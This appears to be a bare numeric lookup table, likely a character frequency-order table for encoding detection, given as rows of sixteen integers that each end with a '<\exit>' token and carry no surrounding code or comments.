2952,5160,1502, 436,3287,4247,3288,2836,4005,2919,3472,3473,5161,2721,2320,5162,<\exit>
5163,2337,2068,  23,4571, 193, 826,3838,2103, 699,1630,4248,3098, 390,1794,1064,<\exit>
3581,5164,1579,3099,3100,1400,5165,4249,1839,1640,2877,5166,4572,4573, 137,4250,<\exit>
598,3101,1967, 780, 104, 974,2953,5167, 278, 899, 253, 402, 572, 504, 493,1339,<\exit>
5168,4006,1275,4574,2582,2558,5169,3706,3049,3102,2253, 565,1334,2722, 863,  41,<\exit>
5170,5171,4575,5172,1657,2338,  19, 463,2760,4251, 606,5173,2999,3289,1087,2085,<\exit>
1323,2662,3000,5174,1631,1623,1750,4252,2691,5175,2878, 791,2723,2663,2339, 232,<\exit>
2421,5176,3001,1498,5177,2664,2630, 755,1366,3707,3290,3151,2026,1609, 119,1918,<\exit>
3474, 862,1026,4253,5178,4007,3839,4576,4008,4577,2265,1952,2477,5179,1125, 817,<\exit>
4254,4255,4009,1513,1766,2041,1487,4256,3050,3291,2837,3840,3152,5180,5181,1507,<\exit>
5182,2692, 733,  40,1632,1106,2879, 345,4257, 841,2531, 230,4578,3002,1847,3292,<\exit>
3475,5183,1263, 986,3476,5184, 735, 879, 254,1137, 857, 622,1300,1180,1388,1562,<\exit>
4010,4011,2954, 967,2761,2665,1349, 592,2134,1692,3361,3003,1995,4258,1679,4012,<\exit>
1902,2188,5185, 739,3708,2724,1296,1290,5186,4259,2201,2202,1922,1563,2605,2559,<\exit>
1871,2762,3004,5187, 435,5188, 343,1108, 596,  17,1751,4579,2239,3477,3709,5189,<\exit>
4580, 294,3582,2955,1693, 477, 979, 281,2042,3583, 643,2043,3710,2631,2795,2266,<\exit>
1031,2340,2135,2303,3584,4581, 367,1249,2560,5190,3585,5191,4582,1283,3362,2005,<\exit>
240,1762,3363,4583,4584, 836,1069,3153, 474,5192,2149,2532, 268,3586,5193,3219,<\exit>
1521,1284,5194,1658,1546,4260,5195,3587,3588,5196,4261,3364,2693,1685,4262, 961,<\exit>
1673,2632, 190,2006,2203,3841,4585,4586,5197, 570,2504,3711,1490,5198,4587,2633,<\exit>
3293,1957,4588, 584,1514, 396,1045,1945,5199,4589,1968,2449,5200,5201,4590,4013,<\exit>
619,5202,3154,3294, 215,2007,2796,2561,3220,4591,3221,4592, 763,4263,3842,4593,<\exit>
5203,5204,1958,1767,2956,3365,3712,1174, 452,1477,4594,3366,3155,5205,2838,1253,<\exit>
2387,2189,1091,2290,4264, 492,5206, 638,1169,1825,2136,1752,4014, 648, 926,1021,<\exit>
1324,4595, 520,4596, 997, 847,1007, 892,4597,3843,2267,1872,3713,2405,1785,4598,<\exit>
1953,2957,3103,3222,1728,4265,2044,3714,4599,2008,1701,3156,1551,  30,2268,4266,<\exit>
5207,2027,4600,3589,5208, 501,5209,4267, 594,3478,2166,1822,3590,3479,3591,3223,<\exit>
829,2839,4268,5210,1680,3157,1225,4269,5211,3295,4601,4270,3158,2341,5212,4602,<\exit>
4271,5213,4015,4016,5214,1848,2388,2606,3367,5215,4603, 374,4017, 652,4272,4273,<\exit>
375,1140, 798,5216,5217,5218,2366,4604,2269, 546,1659, 138,3051,2450,4605,5219,<\exit>
2254, 612,1849, 910, 796,3844,1740,1371, 825,3845,3846,5220,2920,2562,5221, 692,<\exit>
444,3052,2634, 801,4606,4274,5222,1491, 244,1053,3053,4275,4276, 340,5223,4018,<\exit>
1041,3005, 293,1168,  87,1357,5224,1539, 959,5225,2240, 721, 694,4277,3847, 219,<\exit>
1478, 644,1417,3368,2666,1413,1401,1335,1389,4019,5226,5227,3006,2367,3159,1826,<\exit>
730,1515, 184,2840,  66,4607,5228,1660,2958, 246,3369, 378,1457, 226,3480, 975,<\exit>
4020,2959,1264,3592, 674, 696,5229, 163,5230,1141,2422,2167, 713,3593,3370,4608,<\exit>
4021,5231,5232,1186,  15,5233,1079,1070,5234,1522,3224,3594, 276,1050,2725, 758,<\exit>
1126, 653,2960,3296,5235,2342, 889,3595,4022,3104,3007, 903,1250,4609,4023,3481,<\exit>
3596,1342,1681,1718, 766,3297, 286,  89,2961,3715,5236,1713,5237,2607,3371,3008,<\exit>
5238,2962,2219,3225,2880,5239,4610,2505,2533, 181, 387,1075,4024, 731,2190,3372,<\exit>
5240,3298, 310, 313,3482,2304, 770,4278,  54,3054, 189,4611,3105,3848,4025,5241,<\exit>
1230,1617,1850, 355,3597,4279,4612,3373, 111,4280,3716,1350,3160,3483,3055,4281,<\exit>
2150,3299,3598,5242,2797,4026,4027,3009, 722,2009,5243,1071, 247,1207,2343,2478,<\exit>
1378,4613,2010, 864,1437,1214,4614, 373,3849,1142,2220, 667,4615, 442,2763,2563,<\exit>
3850,4028,1969,4282,3300,1840, 837, 170,1107, 934,1336,1883,5244,5245,2119,4283,<\exit>
2841, 743,1569,5246,4616,4284, 582,2389,1418,3484,5247,1803,5248, 357,1395,1729,<\exit>
3717,3301,2423,1564,2241,5249,3106,3851,1633,4617,1114,2086,4285,1532,5250, 482,<\exit>
2451,4618,5251,5252,1492, 833,1466,5253,2726,3599,1641,2842,5254,1526,1272,3718,<\exit>
4286,1686,1795, 416,2564,1903,1954,1804,5255,3852,2798,3853,1159,2321,5256,2881,<\exit>
4619,1610,1584,3056,2424,2764, 443,3302,1163,3161,5257,5258,4029,5259,4287,2506,<\exit>
3057,4620,4030,3162,2104,1647,3600,2011,1873,4288,5260,4289, 431,3485,5261, 250,<\exit>
97,  81,4290,5262,1648,1851,1558, 160, 848,5263, 866, 740,1694,5264,2204,2843,<\exit>
3226,4291,4621,3719,1687, 950,2479, 426, 469,3227,3720,3721,4031,5265,5266,1188,<\exit>
424,1996, 861,3601,4292,3854,2205,2694, 168,1235,3602,4293,5267,2087,1674,4622,<\exit>
3374,3303, 220,2565,1009,5268,3855, 670,3010, 332,1208, 717,5269,5270,3603,2452,<\exit>
4032,3375,5271, 513,5272,1209,2882,3376,3163,4623,1080,5273,5274,5275,5276,2534,<\exit>
3722,3604, 815,1587,4033,4034,5277,3605,3486,3856,1254,4624,1328,3058,1390,4035,<\exit>
1741,4036,3857,4037,5278, 236,3858,2453,3304,5279,5280,3723,3859,1273,3860,4625,<\exit>
5281, 308,5282,4626, 245,4627,1852,2480,1307,2583, 430, 715,2137,2454,5283, 270,<\exit>
199,2883,4038,5284,3606,2727,1753, 761,1754, 725,1661,1841,4628,3487,3724,5285,<\exit>
5286, 587,  14,3305, 227,2608, 326, 480,2270, 943,2765,3607, 291, 650,1884,5287,<\exit>
1702,1226, 102,1547,  62,3488, 904,4629,3489,1164,4294,5288,5289,1224,1548,2766,<\exit>
391, 498,1493,5290,1386,1419,5291,2056,1177,4630, 813, 880,1081,2368, 566,1145,<\exit>
4631,2291,1001,1035,2566,2609,2242, 394,1286,5292,5293,2069,5294,  86,1494,1730,<\exit>
4039, 491,1588, 745, 897,2963, 843,3377,4040,2767,2884,3306,1768, 998,2221,2070,<\exit>
397,1827,1195,1970,3725,3011,3378, 284,5295,3861,2507,2138,2120,1904,5296,4041,<\exit>
2151,4042,4295,1036,3490,1905, 114,2567,4296, 209,1527,5297,5298,2964,2844,2635,<\exit>
2390,2728,3164, 812,2568,5299,3307,5300,1559, 737,1885,3726,1210, 885,  28,2695,<\exit>
3608,3862,5301,4297,1004,1780,4632,5302, 346,1982,2222,2696,4633,3863,1742, 797,<\exit>
1642,4043,1934,1072,1384,2152, 896,4044,3308,3727,3228,2885,3609,5303,2569,1959,<\exit>
4634,2455,1786,5304,5305,5306,4045,4298,1005,1308,3728,4299,2729,4635,4636,1528,<\exit>
2610, 161,1178,4300,1983, 987,4637,1101,4301, 631,4046,1157,3229,2425,1343,1241,<\exit>
1016,2243,2570, 372, 877,2344,2508,1160, 555,1935, 911,4047,5307, 466,1170, 169,<\exit>
1051,2921,2697,3729,2481,3012,1182,2012,2571,1251,2636,5308, 992,2345,3491,1540,<\exit>
2730,1201,2071,2406,1997,2482,5309,4638, 528,1923,2191,1503,1874,1570,2369,3379,<\exit>
3309,5310, 557,1073,5311,1828,3492,2088,2271,3165,3059,3107, 767,3108,2799,4639,<\exit>
1006,4302,4640,2346,1267,2179,3730,3230, 778,4048,3231,2731,1597,2667,5312,4641,<\exit>
5313,3493,5314,5315,5316,3310,2698,1433,3311, 131,  95,1504,4049, 723,4303,3166,<\exit>
1842,3610,2768,2192,4050,2028,2105,3731,5317,3013,4051,1218,5318,3380,3232,4052,<\exit>
4304,2584, 248,1634,3864, 912,5319,2845,3732,3060,3865, 654,  53,5320,3014,5321,<\exit>
1688,4642, 777,3494,1032,4053,1425,5322, 191, 820,2121,2846, 971,4643, 931,3233,<\exit>
135, 664, 783,3866,1998, 772,2922,1936,4054,3867,4644,2923,3234, 282,2732, 640,<\exit>
1372,3495,1127, 922, 325,3381,5323,5324, 711,2045,5325,5326,4055,2223,2800,1937,<\exit>
4056,3382,2224,2255,3868,2305,5327,4645,3869,1258,3312,4057,3235,2139,2965,4058,<\exit>
4059,5328,2225, 258,3236,4646, 101,1227,5329,3313,1755,5330,1391,3314,5331,2924,<\exit>
2057, 893,5332,5333,5334,1402,4305,2347,5335,5336,3237,3611,5337,5338, 878,1325,<\exit>
1781,2801,4647, 259,1385,2585, 744,1183,2272,4648,5339,4060,2509,5340, 684,1024,<\exit>
4306,5341, 472,3612,3496,1165,3315,4061,4062, 322,2153, 881, 455,1695,1152,1340,<\exit>
660, 554,2154,4649,1058,4650,4307, 830,1065,3383,4063,4651,1924,5342,1703,1919,<\exit>
5343, 932,2273, 122,5344,4652, 947, 677,5345,3870,2637, 297,1906,1925,2274,4653,<\exit>
2322,3316,5346,5347,4308,5348,4309,  84,4310, 112, 989,5349, 547,1059,4064, 701,<\exit>
3613,1019,5350,4311,5351,3497, 942, 639, 457,2306,2456, 993,2966, 407, 851, 494,<\exit>
4654,3384, 927,5352,1237,5353,2426,3385, 573,4312, 680, 921,2925,1279,1875, 285,<\exit>
790,1448,1984, 719,2168,5354,5355,4655,4065,4066,1649,5356,1541, 563,5357,1077,<\exit>
5358,3386,3061,3498, 511,3015,4067,4068,3733,4069,1268,2572,3387,3238,4656,4657,<\exit>
5359, 535,1048,1276,1189,2926,2029,3167,1438,1373,2847,2967,1134,2013,5360,4313,<\exit>
1238,2586,3109,1259,5361, 700,5362,2968,3168,3734,4314,5363,4315,1146,1876,1907,<\exit>
4658,2611,4070, 781,2427, 132,1589, 203, 147, 273,2802,2407, 898,1787,2155,4071,<\exit>
4072,5364,3871,2803,5365,5366,4659,4660,5367,3239,5368,1635,3872, 965,5369,1805,<\exit>
2699,1516,3614,1121,1082,1329,3317,4073,1449,3873,  65,1128,2848,2927,2769,1590,<\exit>
3874,5370,5371,  12,2668,  45, 976,2587,3169,4661, 517,2535,1013,1037,3240,5372,<\exit>
3875,2849,5373,3876,5374,3499,5375,2612, 614,1999,2323,3877,3110,2733,2638,5376,<\exit>
2588,4316, 599,1269,5377,1811,3735,5378,2700,3111, 759,1060, 489,1806,3388,3318,<\exit>
1358,5379,5380,2391,1387,1215,2639,2256, 490,5381,5382,4317,1759,2392,2348,5383,<\exit>
4662,3878,1908,4074,2640,1807,3241,4663,3500,3319,2770,2349, 874,5384,5385,3501,<\exit>
3736,1859,  91,2928,3737,3062,3879,4664,5386,3170,4075,2669,5387,3502,1202,1403,<\exit>
3880,2969,2536,1517,2510,4665,3503,2511,5388,4666,5389,2701,1886,1495,1731,4076,<\exit>
2370,4667,5390,2030,5391,5392,4077,2702,1216, 237,2589,4318,2324,4078,3881,4668,<\exit>
4669,2703,3615,3504, 445,4670,5393,5394,5395,5396,2771,  61,4079,3738,1823,4080,<\exit>
5397, 687,2046, 935, 925, 405,2670, 703,1096,1860,2734,4671,4081,1877,1367,2704,<\exit>
3389, 918,2106,1782,2483, 334,3320,1611,1093,4672, 564,3171,3505,3739,3390, 945,<\exit>
2641,2058,4673,5398,1926, 872,4319,5399,3506,2705,3112, 349,4320,3740,4082,4674,<\exit>
3882,4321,3741,2156,4083,4675,4676,4322,4677,2408,2047, 782,4084, 400, 251,4323,<\exit>
1624,5400,5401, 277,3742, 299,1265, 476,1191,3883,2122,4324,4325,1109, 205,5402,<\exit>
2590,1000,2157,3616,1861,5403,5404,5405,4678,5406,4679,2573, 107,2484,2158,4085,<\exit>
3507,3172,5407,1533, 541,1301, 158, 753,4326,2886,3617,5408,1696, 370,1088,4327,<\exit>
4680,3618, 579, 327, 440, 162,2244, 269,1938,1374,3508, 968,3063,  56,1396,3113,<\exit>
2107,3321,3391,5409,1927,2159,4681,3016,5410,3619,5411,5412,3743,4682,2485,5413,<\exit>
2804,5414,1650,4683,5415,2613,5416,5417,4086,2671,3392,1149,3393,4087,3884,4088,<\exit>
5418,1076,  49,5419, 951,3242,3322,3323, 450,2850, 920,5420,1812,2805,2371,4328,<\exit>
1909,1138,2372,3885,3509,5421,3243,4684,1910,1147,1518,2428,4685,3886,5422,4686,<\exit>
2393,2614, 260,1796,3244,5423,5424,3887,3324, 708,5425,3620,1704,5426,3621,1351,<\exit>
1618,3394,3017,1887, 944,4329,3395,4330,3064,3396,4331,5427,3744, 422, 413,1714,<\exit>
3325, 500,2059,2350,4332,2486,5428,1344,1911, 954,5429,1668,5430,5431,4089,2409,<\exit>
4333,3622,3888,4334,5432,2307,1318,2512,3114, 133,3115,2887,4687, 629,  31,2851,<\exit>
2706,3889,4688, 850, 949,4689,4090,2970,1732,2089,4335,1496,1853,5433,4091, 620,<\exit>
3245, 981,1242,3745,3397,1619,3746,1643,3326,2140,2457,1971,1719,3510,2169,5434,<\exit>
3246,5435,5436,3398,1829,5437,1277,4690,1565,2048,5438,1636,3623,3116,5439, 869,<\exit>
2852, 655,3890,3891,3117,4092,3018,3892,1310,3624,4691,5440,5441,5442,1733, 558,<\exit>
4692,3747, 335,1549,3065,1756,4336,3748,1946,3511,1830,1291,1192, 470,2735,2108,<\exit>
2806, 913,1054,4093,5443,1027,5444,3066,4094,4693, 982,2672,3399,3173,3512,3247,<\exit>
3248,1947,2807,5445, 571,4694,5446,1831,5447,3625,2591,1523,2429,5448,2090, 984,<\exit>
4695,3749,1960,5449,3750, 852, 923,2808,3513,3751, 969,1519, 999,2049,2325,1705,<\exit>
5450,3118, 615,1662, 151, 597,4095,2410,2326,1049, 275,4696,3752,4337, 568,3753,<\exit>
3626,2487,4338,3754,5451,2430,2275, 409,3249,5452,1566,2888,3514,1002, 769,2853,<\exit>
194,2091,3174,3755,2226,3327,4339, 628,1505,5453,5454,1763,2180,3019,4096, 521,<\exit>
1161,2592,1788,2206,2411,4697,4097,1625,4340,4341, 412,  42,3119, 464,5455,2642,<\exit>
4698,3400,1760,1571,2889,3515,2537,1219,2207,3893,2643,2141,2373,4699,4700,3328,<\exit>
1651,3401,3627,5456,5457,3628,2488,3516,5458,3756,5459,5460,2276,2092, 460,5461,<\exit>
4701,5462,3020, 962, 588,3629, 289,3250,2644,1116,  52,5463,3067,1797,5464,5465,<\exit>
5466,1467,5467,1598,1143,3757,4342,1985,1734,1067,4702,1280,3402, 465,4703,1572,<\exit>
510,5468,1928,2245,1813,1644,3630,5469,4704,3758,5470,5471,2673,1573,1534,5472,<\exit>
5473, 536,1808,1761,3517,3894,3175,2645,5474,5475,5476,4705,3518,2929,1912,2809,<\exit>
5477,3329,1122, 377,3251,5478, 360,5479,5480,4343,1529, 551,5481,2060,3759,1769,<\exit>
2431,5482,2930,4344,3330,3120,2327,2109,2031,4706,1404, 136,1468,1479, 672,1171,<\exit>
3252,2308, 271,3176,5483,2772,5484,2050, 678,2736, 865,1948,4707,5485,2014,4098,<\exit>
2971,5486,2737,2227,1397,3068,3760,4708,4709,1735,2931,3403,3631,5487,3895, 509,<\exit>
2854,2458,2890,3896,5488,5489,3177,3178,4710,4345,2538,4711,2309,1166,1010, 552,<\exit>
681,1888,5490,5491,2972,2973,4099,1287,1596,1862,3179, 358, 453, 736, 175, 478,<\exit>
1117, 905,1167,1097,5492,1854,1530,5493,1706,5494,2181,3519,2292,3761,3520,3632,<\exit>
4346,2093,4347,5495,3404,1193,2489,4348,1458,2193,2208,1863,1889,1421,3331,2932,<\exit>
3069,2182,3521, 595,2123,5496,4100,5497,5498,4349,1707,2646, 223,3762,1359, 751,<\exit>
3121, 183,3522,5499,2810,3021, 419,2374, 633, 704,3897,2394, 241,5500,5501,5502,<\exit>
838,3022,3763,2277,2773,2459,3898,1939,2051,4101,1309,3122,2246,1181,5503,1136,<\exit>
2209,3899,2375,1446,4350,2310,4712,5504,5505,4351,1055,2615, 484,3764,5506,4102,<\exit>
625,4352,2278,3405,1499,4353,4103,5507,4104,4354,3253,2279,2280,3523,5508,5509,<\exit>
2774, 808,2616,3765,3406,4105,4355,3123,2539, 526,3407,3900,4356, 955,5510,1620,<\exit>
4357,2647,2432,5511,1429,3766,1669,1832, 994, 928,5512,3633,1260,5513,5514,5515,<\exit>
1949,2293, 741,2933,1626,4358,2738,2460, 867,1184, 362,3408,1392,5516,5517,4106,<\exit>
4359,1770,1736,3254,2934,4713,4714,1929,2707,1459,1158,5518,3070,3409,2891,1292,<\exit>
1930,2513,2855,3767,1986,1187,2072,2015,2617,4360,5519,2574,2514,2170,3768,2490,<\exit>
3332,5520,3769,4715,5521,5522, 666,1003,3023,1022,3634,4361,5523,4716,1814,2257,<\exit>
574,3901,1603, 295,1535, 705,3902,4362, 283, 858, 417,5524,5525,3255,4717,4718,<\exit>
3071,1220,1890,1046,2281,2461,4107,1393,1599, 689,2575, 388,4363,5526,2491, 802,<\exit>
5527,2811,3903,2061,1405,2258,5528,4719,3904,2110,1052,1345,3256,1585,5529, 809,<\exit>
5530,5531,5532, 575,2739,3524, 956,1552,1469,1144,2328,5533,2329,1560,2462,3635,<\exit>
3257,4108, 616,2210,4364,3180,2183,2294,5534,1833,5535,3525,4720,5536,1319,3770,<\exit>
3771,1211,3636,1023,3258,1293,2812,5537,5538,5539,3905, 607,2311,3906, 762,2892,<\exit>
1439,4365,1360,4721,1485,3072,5540,4722,1038,4366,1450,2062,2648,4367,1379,4723,<\exit>
2593,5541,5542,4368,1352,1414,2330,2935,1172,5543,5544,3907,3908,4724,1798,1451,<\exit>
5545,5546,5547,5548,2936,4109,4110,2492,2351, 411,4111,4112,3637,3333,3124,4725,<\exit>
1561,2674,1452,4113,1375,5549,5550,  47,2974, 316,5551,1406,1591,2937,3181,5552,<\exit>
1025,2142,3125,3182, 354,2740, 884,2228,4369,2412, 508,3772, 726,3638, 996,2433,<\exit>
3639, 729,5553, 392,2194,1453,4114,4726,3773,5554,5555,2463,3640,2618,1675,2813,<\exit>
919,2352,2975,2353,1270,4727,4115,  73,5556,5557, 647,5558,3259,2856,2259,1550,<\exit>
1346,3024,5559,1332, 883,3526,5560,5561,5562,5563,3334,2775,5564,1212, 831,1347,<\exit>
4370,4728,2331,3909,1864,3073, 720,3910,4729,4730,3911,5565,4371,5566,5567,4731,<\exit>
5568,5569,1799,4732,3774,2619,4733,3641,1645,2376,4734,5570,2938, 669,2211,2675,<\exit>
2434,5571,2893,5572,5573,1028,3260,5574,4372,2413,5575,2260,1353,5576,5577,4735,<\exit>
3183, 518,5578,4116,5579,4373,1961,5580,2143,4374,5581,5582,3025,2354,2355,3912,<\exit>
516,1834,1454,4117,2708,4375,4736,2229,2620,1972,1129,3642,5583,2776,5584,2976,<\exit>
1422, 577,1470,3026,1524,3410,5585,5586, 432,4376,3074,3527,5587,2594,1455,2515,<\exit>
2230,1973,1175,5588,1020,2741,4118,3528,4737,5589,2742,5590,1743,1361,3075,3529,<\exit>
2649,4119,4377,4738,2295, 895, 924,4378,2171, 331,2247,3076, 166,1627,3077,1098,<\exit>
5591,1232,2894,2231,3411,4739, 657, 403,1196,2377, 542,3775,3412,1600,4379,3530,<\exit>
5592,4740,2777,3261, 576, 530,1362,4741,4742,2540,2676,3776,4120,5593, 842,3913,<\exit>
5594,2814,2032,1014,4121, 213,2709,3413, 665, 621,4380,5595,3777,2939,2435,5596,<\exit>
2436,3335,3643,3414,4743,4381,2541,4382,4744,3644,1682,4383,3531,1380,5597, 724,<\exit>
2282, 600,1670,5598,1337,1233,4745,3126,2248,5599,1621,4746,5600, 651,4384,5601,<\exit>
1612,4385,2621,5602,2857,5603,2743,2312,3078,5604, 716,2464,3079, 174,1255,2710,<\exit>
4122,3645, 548,1320,1398, 728,4123,1574,5605,1891,1197,3080,4124,5606,3081,3082,<\exit>
3778,3646,3779, 747,5607, 635,4386,4747,5608,5609,5610,4387,5611,5612,4748,5613,<\exit>
3415,4749,2437, 451,5614,3780,2542,2073,4388,2744,4389,4125,5615,1764,4750,5616,<\exit>
4390, 350,4751,2283,2395,2493,5617,4391,4126,2249,1434,4127, 488,4752, 458,4392,<\exit>
4128,3781, 771,1330,2396,3914,2576,3184,2160,2414,1553,2677,3185,4393,5618,2494,<\exit>
2895,2622,1720,2711,4394,3416,4753,5619,2543,4395,5620,3262,4396,2778,5621,2016,<\exit>
2745,5622,1155,1017,3782,3915,5623,3336,2313, 201,1865,4397,1430,5624,4129,5625,<\exit>
5626,5627,5628,5629,4398,1604,5630, 414,1866, 371,2595,4754,4755,3532,2017,3127,<\exit>
4756,1708, 960,4399, 887, 389,2172,1536,1663,1721,5631,2232,4130,2356,2940,1580,<\exit>
5632,5633,1744,4757,2544,4758,4759,5634,4760,5635,2074,5636,4761,3647,3417,2896,<\exit>
4400,5637,4401,2650,3418,2815, 673,2712,2465, 709,3533,4131,3648,4402,5638,1148,<\exit>
502, 634,5639,5640,1204,4762,3649,1575,4763,2623,3783,5641,3784,3128, 948,3263,<\exit>
121,1745,3916,1110,5642,4403,3083,2516,3027,4132,3785,1151,1771,3917,1488,4133,<\exit>
1987,5643,2438,3534,5644,5645,2094,5646,4404,3918,1213,1407,2816, 531,2746,2545,<\exit>
3264,1011,1537,4764,2779,4405,3129,1061,5647,3786,3787,1867,2897,5648,2018, 120,<\exit>
4406,4407,2063,3650,3265,2314,3919,2678,3419,1955,4765,4134,5649,3535,1047,2713,<\exit>
1266,5650,1368,4766,2858, 649,3420,3920,2546,2747,1102,2859,2679,5651,5652,2000,<\exit>
5653,1111,3651,2977,5654,2495,3921,3652,2817,1855,3421,3788,5655,5656,3422,2415,<\exit>
2898,3337,3266,3653,5657,2577,5658,3654,2818,4135,1460, 856,5659,3655,5660,2899,<\exit>
2978,5661,2900,3922,5662,4408, 632,2517, 875,3923,1697,3924,2296,5663,5664,4767,<\exit>
3028,1239, 580,4768,4409,5665, 914, 936,2075,1190,4136,1039,2124,5666,5667,5668,<\exit>
5669,3423,1473,5670,1354,4410,3925,4769,2173,3084,4137, 915,3338,4411,4412,3339,<\exit>
1605,1835,5671,2748, 398,3656,4413,3926,4138, 328,1913,2860,4139,3927,1331,4414,<\exit>
3029, 937,4415,5672,3657,4140,4141,3424,2161,4770,3425, 524, 742, 538,3085,1012,<\exit>
5673,5674,3928,2466,5675, 658,1103, 225,3929,5676,5677,4771,5678,4772,5679,3267,<\exit>
1243,5680,4142, 963,2250,4773,5681,2714,3658,3186,5682,5683,2596,2332,5684,4774,<\exit>
5685,5686,5687,3536, 957,3426,2547,2033,1931,2941,2467, 870,2019,3659,1746,2780,<\exit>
2781,2439,2468,5688,3930,5689,3789,3130,3790,3537,3427,3791,5690,1179,3086,5691,<\exit>
3187,2378,4416,3792,2548,3188,3131,2749,4143,5692,3428,1556,2549,2297, 977,2901,<\exit>
2034,4144,1205,3429,5693,1765,3430,3189,2125,1271, 714,1689,4775,3538,5694,2333,<\exit>
3931, 533,4417,3660,2184, 617,5695,2469,3340,3539,2315,5696,5697,3190,5698,5699,<\exit>
3932,1988, 618, 427,2651,3540,3431,5700,5701,1244,1690,5702,2819,4418,4776,5703,<\exit>
3541,4777,5704,2284,1576, 473,3661,4419,3432, 972,5705,3662,5706,3087,5707,5708,<\exit>
4778,4779,5709,3793,4145,4146,5710, 153,4780, 356,5711,1892,2902,4420,2144, 408,<\exit>
803,2357,5712,3933,5713,4421,1646,2578,2518,4781,4782,3934,5714,3935,4422,5715,<\exit>
2416,3433, 752,5716,5717,1962,3341,2979,5718, 746,3030,2470,4783,4423,3794, 698,<\exit>
4784,1893,4424,3663,2550,4785,3664,3936,5719,3191,3434,5720,1824,1302,4147,2715,<\exit>
3937,1974,4425,5721,4426,3192, 823,1303,1288,1236,2861,3542,4148,3435, 774,3938,<\exit>
5722,1581,4786,1304,2862,3939,4787,5723,2440,2162,1083,3268,4427,4149,4428, 344,<\exit>
1173, 288,2316, 454,1683,5724,5725,1461,4788,4150,2597,5726,5727,4789, 985, 894,<\exit>
5728,3436,3193,5729,1914,2942,3795,1989,5730,2111,1975,5731,4151,5732,2579,1194,<\exit>
425,5733,4790,3194,1245,3796,4429,5734,5735,2863,5736, 636,4791,1856,3940, 760,<\exit>
1800,5737,4430,2212,1508,4792,4152,1894,1684,2298,5738,5739,4793,4431,4432,2213,<\exit>
479,5740,5741, 832,5742,4153,2496,5743,2980,2497,3797, 990,3132, 627,1815,2652,<\exit>
4433,1582,4434,2126,2112,3543,4794,5744, 799,4435,3195,5745,4795,2113,1737,3031,<\exit>
1018, 543, 754,4436,3342,1676,4796,4797,4154,4798,1489,5746,3544,5747,2624,2903,<\exit>
4155,5748,5749,2981,5750,5751,5752,5753,3196,4799,4800,2185,1722,5754,3269,3270,<\exit>
1843,3665,1715, 481, 365,1976,1857,5755,5756,1963,2498,4801,5757,2127,3666,3271,<\exit>
433,1895,2064,2076,5758, 602,2750,5759,5760,5761,5762,5763,3032,1628,3437,5764,<\exit>
3197,4802,4156,2904,4803,2519,5765,2551,2782,5766,5767,5768,3343,4804,2905,5769,<\exit>
4805,5770,2864,4806,4807,1221,2982,4157,2520,5771,5772,5773,1868,1990,5774,5775,<\exit>
5776,1896,5777,5778,4808,1897,4158, 318,5779,2095,4159,4437,5780,5781, 485,5782,<\exit>
938,3941, 553,2680, 116,5783,3942,3667,5784,3545,2681,2783,3438,3344,2820,5785,<\exit>
3668,2943,4160,1747,2944,2983,5786,5787, 207,5788,4809,5789,4810,2521,5790,3033,<\exit>
890,3669,3943,5791,1878,3798,3439,5792,2186,2358,3440,1652,5793,5794,5795, 941,<\exit>
2299, 208,3546,4161,2020, 330,4438,3944,2906,2499,3799,4439,4811,5796,5797,5798,<\exit>
2522,1613,4812,5799,3345,3945,2523,5800,4162,5801,1637,4163,2471,4813,3946,5802,<\exit>
2500,3034,3800,5803,5804,2195,4814,5805,2163,5806,5807,5808,5809,5810,5811,5812,<\exit>
5813,5814,5815,5816,5817,5818,5819,5820,5821,5822,5823,5824,5825,5826,5827,5828,<\exit>
5829,5830,5831,5832,5833,5834,5835,5836,5837,5838,5839,5840,5841,5842,5843,5844,<\exit>
5845,5846,5847,5848,5849,5850,5851,5852,5853,5854,5855,5856,5857,5858,5859,5860,<\exit>
5861,5862,5863,5864,5865,5866,5867,5868,5869,5870,5871,5872,5873,5874,5875,5876,<\exit>
5877,5878,5879,5880,5881,5882,5883,5884,5885,5886,5887,5888,5889,5890,5891,5892,<\exit>
5893,5894,5895,5896,5897,5898,5899,5900,5901,5902,5903,5904,5905,5906,5907,5908,<\exit>
5909,5910,5911,5912,5913,5914,5915,5916,5917,5918,5919,5920,5921,5922,5923,5924,<\exit>
5925,5926,5927,5928,5929,5930,5931,5932,5933,5934,5935,5936,5937,5938,5939,5940,<\exit>
5941,5942,5943,5944,5945,5946,5947,5948,5949,5950,5951,5952,5953,5954,5955,5956,<\exit>
5957,5958,5959,5960,5961,5962,5963,5964,5965,5966,5967,5968,5969,5970,5971,5972,<\exit>
5973,5974,5975,5976,5977,5978,5979,5980,5981,5982,5983,5984,5985,5986,5987,5988,<\exit>
5989,5990,5991,5992,5993,5994,5995,5996,5997,5998,5999,6000,6001,6002,6003,6004,<\exit>
6005,6006,6007,6008,6009,6010,6011,6012,6013,6014,6015,6016,6017,6018,6019,6020,<\exit>
6021,6022,6023,6024,6025,6026,6027,6028,6029,6030,6031,6032,6033,6034,6035,6036,<\exit>
6037,6038,6039,6040,6041,6042,6043,6044,6045,6046,6047,6048,6049,6050,6051,6052,<\exit>
6053,6054,6055,6056,6057,6058,6059,6060,6061,6062,6063,6064,6065,6066,6067,6068,<\exit>
6069,6070,6071,6072,6073,6074,6075,6076,6077,6078,6079,6080,6081,6082,6083,6084,<\exit>
6085,6086,6087,6088,6089,6090,6091,6092,6093,6094,6095,6096,6097,6098,6099,6100,<\exit>
6101,6102,6103,6104,6105,6106,6107,6108,6109,6110,6111,6112,6113,6114,6115,6116,<\exit>
6117,6118,6119,6120,6121,6122,6123,6124,6125,6126,6127,6128,6129,6130,6131,6132,<\exit>
6133,6134,6135,6136,6137,6138,6139,6140,6141,6142,6143,6144,6145,6146,6147,6148,<\exit>
6149,6150,6151,6152,6153,6154,6155,6156,6157,6158,6159,6160,6161,6162,6163,6164,<\exit>
6165,6166,6167,6168,6169,6170,6171,6172,6173,6174,6175,6176,6177,6178,6179,6180,<\exit>
6181,6182,6183,6184,6185,6186,6187,6188,6189,6190,6191,6192,6193,6194,6195,6196,<\exit>
6197,6198,6199,6200,6201,6202,6203,6204,6205,6206,6207,6208,6209,6210,6211,6212,<\exit>
6213,6214,6215,6216,6217,6218,6219,6220,6221,6222,6223,3670,6224,6225,6226,6227,<\exit>
6228,6229,6230,6231,6232,6233,6234,6235,6236,6237,6238,6239,6240,6241,6242,6243,<\exit>
6244,6245,6246,6247,6248,6249,6250,6251,6252,6253,6254,6255,6256,6257,6258,6259,<\exit>
6260,6261,6262,6263,6264,6265,6266,6267,6268,6269,6270,6271,6272,6273,6274,6275,<\exit>
6276,6277,6278,6279,6280,6281,6282,6283,6284,6285,4815,6286,6287,6288,6289,6290,<\exit>
